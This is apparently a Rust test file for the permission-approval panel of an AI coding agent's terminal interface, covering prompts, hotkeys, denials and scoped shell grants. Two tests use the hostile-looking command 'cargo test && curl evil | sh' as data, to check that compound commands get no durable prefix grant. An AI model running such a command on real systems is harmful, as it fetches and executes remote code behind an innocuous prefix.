use super::*;

#[test]
fn permission_prompt_renders_inline_with_command_body() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    core.transcript.push_event(event(
        EventKind::ASSISTANT_MESSAGE,
        object([("content", "Model chatg ".repeat(60).into())]),
    ));
    core.transcript.push_event(event(
        EventKind::TOOL_CALL,
        object([
            ("id", "call-shell".into()),
            ("name", "run_shell".into()),
            (
                "input",
                serde_json::json!({"command": "bash -lc 'cargo test'"}),
            ),
        ]),
    ));
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    )));

    terminal.draw(|frame| core.render(frame)).expect("draw");

    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("Run command?"));
    assert!(!contents.contains("Approval required"));
    assert!(contents.contains("shell-exec · cwd"));
    assert!(contents.contains("$ cargo test"));
    assert!(!contents.contains("command: $"));
    assert!(contents.contains("y  Allow once"));
    assert!(!contents.contains("(default selection)"));
    assert!(contents.contains("a  Allow all shell commands for this session"));
    assert!(contents.contains("p  Allow all shell commands in this project"));
    assert!(contents.contains("n/esc  Deny"));
    assert!(contents.contains("Deny with instructions"));
    assert!(!contents.contains("hint: every decision is logged"));
    assert!(!contents.contains("commands that start"));
    assert!(contents.contains("▌"));
    assert!(contents.contains("echo(medium) · ctx ?%"));
    assert!(!contents.contains("Context ?% used"));
    assert!(!contents.contains("⠧ working"));

    let rows = terminal.backend().screen_rows();
    assert!(
        rows[row_containing(&rows, "Run command?")].starts_with("│ "),
        "permission question should use bordered approval panel: {rows:?}"
    );
    assert!(
        rows[row_containing(&rows, "y  Allow once")].starts_with("│ "),
        "permission options should use bordered approval panel: {rows:?}"
    );
}

#[test]
fn permission_prompt_uses_newest_run_shell_despite_later_non_shell_call() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    core.transcript.push_event(event(
        EventKind::TOOL_CALL,
        object([
            ("id", "call-shell".into()),
            ("name", "run_shell".into()),
            (
                "input",
                serde_json::json!({"command": "bash -lc 'cargo test'"}),
            ),
        ]),
    ));
    core.transcript.push_event(event(
        EventKind::TOOL_CALL,
        object([
            ("id", "call-read".into()),
            ("name", "read_file".into()),
            ("input", serde_json::json!({"path": "Cargo.toml"})),
        ]),
    ));
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    )));

    terminal.draw(|frame| core.render(frame)).expect("draw");

    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("Run command?"));
    assert!(!contents.contains("Approval required"));
    assert!(contents.contains("$ cargo test"));

    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::FsWrite,
        "tool edit_file".to_owned(),
    )));
    terminal.draw(|frame| core.render(frame)).expect("draw");

    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("Edit file?"));
    assert!(contents.contains("fs-write · cwd"));
    assert!(!contents.contains("$ cargo test"));
    assert!(!contents.contains("Approval required"));
}

#[test]
fn non_patch_permission_uses_generic_inline_ask() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    let request = PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned());
    core.modal = Some(core.modal_for_request(request));

    terminal.draw(|frame| core.render(frame)).expect("draw");

    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("Run command?"));
    assert!(!contents.contains("Approval required"));
    assert!(contents.contains("a  Allow all shell commands for this session"));
    assert!(contents.contains("p  Allow all shell commands in this project"));
    assert!(!contents.contains("Patch approval required"));
}

#[test]
fn permission_panel_consequences_use_available_write_scope() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::FsWrite, "tool edit_file".to_owned())
            .with_path("src/main.rs"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");

    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("Edit file?"), "contents: {contents:?}");
    assert!(
        contents.contains("write scope src"),
        "contents: {contents:?}"
    );
    // v2.1 (§7b): unknown/zero fields are omitted, not padded with "ran-before 0×".
    assert!(!contents.contains("ran-before"), "contents: {contents:?}");
}

#[test]
fn inline_permission_ask_has_blank_line_before_options_and_gold_selection() {
    let mut core = core();
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    )));

    let lines = core.visual_canvas_frame(80).active_frame_lines;
    let plain = lines
        .iter()
        .map(crate::ui::visual_canvas::CanvasLine::plain_text)
        .collect::<Vec<_>>();

    let options_row = plain
        .iter()
        .position(|line| line.contains("y  Allow once"))
        .expect("options row present");
    assert!(
        plain[options_row - 1].trim_matches(['│', ' ']).is_empty(),
        "a blank line should separate the command block from the options: {plain:?}"
    );

    let selected_style = lines[options_row]
        .spans
        .iter()
        .find(|span| span.text.as_str().contains("Allow once"))
        .expect("selected span")
        .style;
    assert_eq!(
        selected_style.fg,
        Some(core.theme.palette.warning),
        "the default-selected option should use gold text"
    );
    assert_eq!(
        selected_style.bg,
        Some(core.theme.palette.selection),
        "the default-selected option should use the select-bg token"
    );
}

#[test]
fn inline_permission_ask_keeps_all_options_visible_on_short_terminal() {
    let mut terminal = Terminal::new(VT100Backend::new(58, 12)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    )));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let rows = terminal.backend().screen_rows();
    let one = row_containing(&rows, "y  Allow once");
    let two = row_containing(&rows, "a  Allow all shell commands");
    let three = row_containing(&rows, "p  Allow all shell commands");
    let four = row_containing(&rows, "n/esc  Deny");
    let border = row_containing(&rows, "╰");
    let prompt = row_containing(&rows, "▌");
    let status = row_containing(&rows, "echo(medium) · ctx");
    assert!(one < two && two < three && three < four, "rows: {rows:?}");
    assert!(four < border && border < prompt, "rows: {rows:?}");
    assert_eq!(
        status,
        prompt + 1,
        "short viewport should prioritize permission options over footer spacer, rows: {rows:?}"
    );

    assert_eq!(core.handle_input(key(KeyCode::Esc)), CoreEffect::Render);
    assert_eq!(reply_rx.recv().expect("reply"), PermissionReply::Deny);
}

#[test]
fn inline_terminal_permission_ask_keeps_options_visible_in_constrained_viewport() {
    let mut terminal = crate::ui::terminal::InlineTerminal::new(VT100Backend::new(80, 9), 9)
        .expect("inline terminal");
    let mut core = core();
    core.notice = Some("lower priority notice".to_owned());
    core.transcript.push_event(event(
        EventKind::MODEL_DELTA,
        object([
            ("kind", "text".into()),
            ("delta", "live transcript should yield\n".into()),
        ]),
    ));
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::FsWrite,
        "tool edit_file".to_owned(),
    )));

    render_inline_frame(&mut terminal, &mut core);

    let rows = terminal.backend().screen_rows();
    let three = row_containing(&rows, "n/esc  Deny");
    let border = row_containing(&rows, "╰");
    let prompt = row_containing(&rows, "▌");
    let status = row_containing(&rows, "echo(medium) · ctx");
    assert_eq!(terminal.viewport_area().height, 9);
    assert!(three < border && border < prompt, "rows: {rows:?}");
    assert_footer_breathing_room(&rows, prompt, status);
    assert!(
        !rows.iter().any(|row| row.contains("lower priority notice")),
        "notice should yield before permission options clip, rows: {rows:?}"
    );
    assert!(
        !rows
            .iter()
            .any(|row| row.contains("live transcript should yield")),
        "transcript should yield before permission options clip, rows: {rows:?}"
    );
}

#[test]
fn inline_patch_approval_ask_hides_working_status_and_keeps_options_visible() {
    let mut terminal = crate::ui::terminal::InlineTerminal::new(VT100Backend::new(80, 13), 13)
        .expect("inline terminal");
    let mut core = core();
    let (_tx, worker_rx) = mpsc::channel();
    core.state = AppState::TurnInFlight {
        worker_rx,
        interrupt_flag: Arc::new(AtomicBool::new(false)),
        started_at: Instant::now(),
    };
    core.modal = Some(patch_modal(diff_preview("alpha\n", "beta\n")));

    render_inline_frame(&mut terminal, &mut core);

    let rows = terminal.backend().screen_rows();
    let one = row_containing(&rows, "y  Allow once");
    let two = row_containing(&rows, "a  Allow fs-write");
    let three = row_containing(&rows, "p  Allow fs-write");
    let four = row_containing(&rows, "n/esc  Deny");
    let prompt = row_containing(&rows, "▌");
    let status = row_containing(&rows, "echo(medium) · ctx");
    assert!(one < two && two < three && three < four, "rows: {rows:?}");
    assert!(four < prompt, "rows: {rows:?}");
    assert_footer_breathing_room(&rows, prompt, status);
    assert!(
        !rows.iter().any(|row| row.contains("⠧ working")),
        "patch approval should own the live flow, rows: {rows:?}"
    );
}

#[test]
fn permission_inline_ask_esc_denies_and_restores_composer_status() {
    let width = 48;
    let height = 16;
    let mut terminal = Terminal::new(VT100Backend::new(width, height)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.transcript.push_event(event(
        EventKind::MODEL_DELTA,
        object([
            ("kind", "text".into()),
            ("delta", "underlying transcript\n".into()),
        ]),
    ));
    core.bottom.composer_mut().insert_text("draft");
    // Real open path: the pre-existing draft is stashed, NOT consumed as an
    // instruction (issue #60 — it used to disable hotkeys and leak into the
    // deny reply).
    core.open_permission_modal(PermissionRequest::new(
        Capability::ShellExec,
        "run command".to_owned(),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");

    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("Run command?"));
    assert!(!contents.contains("Approval required"));

    assert_eq!(core.handle_input(key(KeyCode::Esc)), CoreEffect::Render);
    assert_eq!(reply_rx.recv().expect("reply"), PermissionReply::Deny);
    assert!(
        core.queued_inputs.is_empty(),
        "stashed draft must not be queued as an instruction"
    );
    assert_eq!(core.bottom.composer().submit_text(), "draft");
    terminal.draw(|frame| core.render(frame)).expect("redraw");

    let restored = terminal.backend().screen_contents();
    assert!(!restored.contains("Run command?"));
    assert!(restored.contains("underlying transcript"));
    assert!(restored.contains("echo(medium) · ctx ?%"));
    assert!(!restored.contains("Context ?% used"));
}

#[test]
fn empty_deny_leaves_composer_empty_without_ghost_text() {
    // #57: spec §13.2 is unconditional — an empty composer is rail + dim
    // cursor only, in every state, including right after a bare deny. The
    // transcript's own `denied` event line is the single carrier of that
    // guidance; the composer must not restate it.
    let mut terminal = Terminal::new(VT100Backend::new(80, 16)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "run command".to_owned(),
    )));

    assert_eq!(
        core.handle_input(key(KeyCode::Char('n'))),
        CoreEffect::Render
    );
    assert_eq!(reply_rx.recv().expect("reply"), PermissionReply::Deny);
    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(!contents.contains("denied — tell euler what to do instead"));
    assert_eq!(core.bottom.composer().submit_text(), "");
}

#[test]
fn typed_permission_instruction_does_not_fire_hotkeys() {
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.open_permission_modal(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    ));

    for code in [
        KeyCode::Char('w'),
        KeyCode::Char('a'),
        KeyCode::Char('i'),
        KeyCode::Char('t'),
        KeyCode::Char('y'),
        KeyCode::Backspace,
    ] {
        assert_eq!(core.handle_input(key(code)), CoreEffect::Render);
    }
    assert!(matches!(
        reply_rx.recv_timeout(Duration::from_millis(100)),
        Err(mpsc::RecvTimeoutError::Timeout)
    ));

    assert_eq!(core.handle_input(key(KeyCode::Esc)), CoreEffect::Render);
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::DenyWithInstruction("wait".into())
    );
}

#[test]
fn empty_permission_instruction_keeps_y_hotkey() {
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    )));

    assert_eq!(
        core.handle_input(key(KeyCode::Char('y'))),
        CoreEffect::Render
    );
    assert_eq!(reply_rx.recv().expect("reply"), PermissionReply::AllowOnce);
}

#[test]
fn preexisting_draft_keeps_hotkeys_live_and_survives_the_decision() {
    // Issue #60: an ask arriving while the composer held typed-but-unsent
    // text wedged the panel — y/a/p/n dead, arrows dead, esc-only (which
    // then consumed the unrelated draft as the deny instruction).
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.bottom
        .composer_mut()
        .insert_text("also just saying hia");

    core.open_permission_modal(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    ));

    // Hotkeys are live because the panel's instruction input starts empty.
    assert_eq!(
        core.handle_input(key(KeyCode::Char('y'))),
        CoreEffect::Render
    );
    assert_eq!(reply_rx.recv().expect("reply"), PermissionReply::AllowOnce);
    // The user's draft comes back untouched.
    assert_eq!(core.bottom.composer().submit_text(), "also just saying hia");
    assert!(core.queued_inputs.is_empty());
}

#[test]
fn instruction_typed_inside_the_panel_denies_and_restores_the_stash() {
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.bottom.composer_mut().insert_text("pre-ask draft");
    core.open_permission_modal(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    ));

    for ch in ['u', 's', 'e', ' ', 'l', 's'] {
        assert_eq!(
            core.handle_input(key(KeyCode::Char(ch))),
            CoreEffect::Render
        );
    }
    assert_eq!(core.handle_input(key(KeyCode::Esc)), CoreEffect::Render);

    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::DenyWithInstruction("use ls".into())
    );
    // The instruction queues at the front — absorbed by the running turn's
    // next round boundary (steering), or flushed as the next turn if the
    // denial ended the turn. The pre-ask draft returns to the composer.
    assert_eq!(
        core.queued_inputs.snapshot().first().map(String::as_str),
        Some("use ls")
    );
    assert_eq!(core.bottom.composer().submit_text(), "pre-ask draft");
}

#[test]
fn compound_commands_offer_unscoped_grants_not_token_scopes() {
    // Issue #61: scoped grants never cover compound commands, so offering
    // 'Allow cd *' for `cd … && find …` was a grant that could not even
    // cover a rerun of the command it was derived from.
    let mut terminal = Terminal::new(VT100Backend::new(96, 24)).expect("terminal");
    let mut core = core();
    let (reply_tx, _reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.open_permission_modal(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell")
            .with_command("cd /work && find . -name '*.rs' | head -5"),
    );

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();

    assert!(
        !contents.contains("Allow cd *"),
        "token scope must not be offered for a compound command: {contents}"
    );
    assert!(contents.contains("Allow all shell commands for this session"));
    assert!(contents.contains("Allow all shell commands in this project"));
}

#[test]
fn scoped_shell_labels_and_replies_use_command_prefix() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("cargo test -q"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("a  Allow cargo * for this session"));
    assert!(contents.contains("p  Allow cargo * in this project"));

    assert_eq!(
        core.handle_input(key(KeyCode::Char('a'))),
        CoreEffect::Render
    );
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::AllowSessionScope("cargo".into())
    );
}

#[test]
fn user_rule_option_renders_and_replies_when_enabled() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    core.user_rules_enabled = true;
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("cargo test -q"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("u  Allow cargo * always"));

    // Down from the default walks once → session → project → user → deny.
    for _ in 0..3 {
        core.handle_input(key(KeyCode::Down));
    }
    assert_eq!(core.approval_selection, ApprovalOption::AllowUser);
    core.handle_input(key(KeyCode::Down));
    assert_eq!(core.approval_selection, ApprovalOption::Deny);

    assert_eq!(
        core.handle_input(key(KeyCode::Char('u'))),
        CoreEffect::Render
    );
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::AllowUserScope("cargo".into())
    );
}

#[test]
fn user_rule_option_absent_without_user_store() {
    // SessionConfig::new has no user_grant_dir, so the store is inert and
    // the panel must not offer a durable rule it cannot install.
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("cargo test -q"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(!contents.contains("* always"), "contents: {contents}");

    // Navigation skips the hidden row: project → deny directly.
    for _ in 0..3 {
        core.handle_input(key(KeyCode::Down));
    }
    assert_eq!(core.approval_selection, ApprovalOption::Deny);

    // `u` types into the composer instead of deciding.
    assert_eq!(
        core.handle_input(key(KeyCode::Char('u'))),
        CoreEffect::Render
    );
    assert!(matches!(
        reply_rx.recv_timeout(Duration::from_millis(100)),
        Err(mpsc::RecvTimeoutError::Timeout)
    ));
    assert_eq!(core.handle_input(key(KeyCode::Esc)), CoreEffect::Render);
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::DenyWithInstruction("u".into())
    );
}

#[test]
fn compound_command_with_one_unsafe_token_offers_that_token_scope() {
    // Issue #78: coverage is segment-aware, so the panel may offer a token
    // scope for a parseable compound command when every unsafe segment
    // shares one first token — a `cargo` grant really covers this rerun.
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("cargo test && cargo clippy"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("a  Allow cargo * for this session"));

    assert_eq!(
        core.handle_input(key(KeyCode::Char('a'))),
        CoreEffect::Render
    );
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::AllowSessionScope("cargo".into())
    );
}

#[test]
fn user_rule_option_hidden_for_compound_and_unscoped_asks() {
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    core.user_rules_enabled = true;
    // Compound command: a prefix rule would authorize everything after the
    // separator, so the durable option must not be offered.
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("cargo test && curl evil | sh"),
    ));
    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(!contents.contains("* always"), "contents: {contents}");

    // Unscoped ask (no command): nothing honest to derive.
    core.modal = Some(Modal::Permission(PermissionRequest::new(
        Capability::ShellExec,
        "tool run_shell".to_owned(),
    )));
    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(!contents.contains("* always"), "contents: {contents}");
}

#[test]
fn compound_command_with_distinct_unsafe_tokens_offers_unscoped_only() {
    // No single token grant can cover `cargo test && curl evil`, so
    // offering one would be dishonest (issue #61): fall back to the
    // capability-wide labels and an unscoped reply.
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("cargo test && curl evil"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("a  Allow all shell commands for this session"));
    assert!(!contents.contains("Allow cargo *"));

    assert_eq!(
        core.handle_input(key(KeyCode::Char('a'))),
        CoreEffect::Render
    );
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::AllowSessionScope(String::new())
    );
}

#[test]
fn unparseable_command_offers_unscoped_only() {
    // Redirects make a command not statically analyzable: no scoped grant
    // can ever cover it, so no token scope may be offered (issue #61).
    let mut terminal = Terminal::new(VT100Backend::new(80, 24)).expect("terminal");
    let mut core = core();
    let (reply_tx, _reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::ShellExec, "tool run_shell".to_owned())
            .with_command("ls > listing.txt"),
    ));

    terminal.draw(|frame| core.render(frame)).expect("draw");
    let contents = terminal.backend().screen_contents();
    assert!(contents.contains("a  Allow all shell commands for this session"));
    assert!(!contents.contains("Allow ls *"));
}

#[test]
fn project_scope_key_sends_project_prefix() {
    let mut core = core();
    let (reply_tx, reply_rx) = mpsc::channel();
    core.reply_tx = reply_tx;
    core.modal = Some(Modal::Permission(
        PermissionRequest::new(Capability::FsWrite, "tool edit_file".to_owned())
            .with_path("src/main.rs"),
    ));

    assert_eq!(
        core.handle_input(key(KeyCode::Char('p'))),
        CoreEffect::Render
    );
    assert_eq!(
        reply_rx.recv().expect("reply"),
        PermissionReply::AllowProjectScope("src".into())
    );
}

fn row_containing(rows: &[String], needle: &str) -> usize {
    rows.iter()
        .position(|row| row.contains(needle))
        .unwrap_or_else(|| panic!("expected row containing {needle:?}, rows: {rows:?}"))
}

fn assert_footer_breathing_room(rows: &[String], prompt: usize, status: usize) {
    assert_eq!(status, prompt + 2, "rows: {rows:?}");
    assert!(rows[prompt + 1].trim().is_empty(), "rows: {rows:?}");
}

fn render_inline_frame(
    terminal: &mut crate::ui::terminal::InlineTerminal<VT100Backend>,
    core: &mut AppCore,
) {
    let width = terminal.size().expect("terminal size").width;
    let frame = core.render_visual_canvas(width);
    terminal
        .draw_visual_frame(&frame)
        .expect("draw visual frame");
}
